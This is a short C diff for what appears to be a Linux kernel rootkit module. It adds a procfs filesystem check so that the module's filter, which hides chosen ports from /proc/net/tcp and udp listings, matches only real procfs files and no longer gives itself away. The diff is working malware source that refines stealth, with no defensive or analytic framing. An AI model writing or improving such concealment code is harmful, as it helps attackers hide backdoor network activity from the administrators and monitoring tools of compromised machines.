@@ -4,6 +4,7 @@
  * ruby570bocadito © 2026
  */
 #include "core.h"
+#include <linux/magic.h>   /* PROC_SUPER_MAGIC */
 
 /* Hidden ports stored in HOST byte order — /proc/net/tcp prints
  * ports as %04X of the host-order value, so no conversion needed. */
@@ -187,6 +188,16 @@ static int is_proc_net_file(struct file *file) {
     const unsigned char *name;
 
     if (!file || !file->f_path.dentry)
+        return 0;
+
+    /*
+     * v3.4 fix: the v3.3 check matched ONLY the dentry name, so ANY
+     * file called "tcp"/"udp"/"tcp6"/"udp6" anywhere (e.g. ./tcp in
+     * the cwd) was filtered while hidden ports were active.  Require
+     * the file to actually live on procfs before trusting the name.
+     */
+    if (!file->f_inode ||
+        file->f_inode->i_sb->s_magic != PROC_SUPER_MAGIC)
         return 0;
 
     name = file->f_path.dentry->d_name.name;
